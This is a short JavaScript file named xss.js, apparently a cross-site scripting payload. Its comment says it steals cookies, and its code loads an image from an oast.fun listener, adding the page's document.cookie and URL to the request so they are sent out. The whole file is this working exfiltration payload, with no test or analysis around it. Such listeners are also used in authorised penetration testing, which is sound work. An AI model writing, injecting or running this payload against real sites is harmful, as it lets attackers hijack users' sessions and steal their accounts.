// xss.js - Steal cookies and send to OAST listener
(function() {
  var i = new Image();
  i.src = "https://atjslilmjuhobfbjtydtxax2ffk08ryaf.oast.fun/?" + 
          "cookie=" + encodeURIComponent(document.cookie) + 
          "&location=" + encodeURIComponent(location.href);
})();
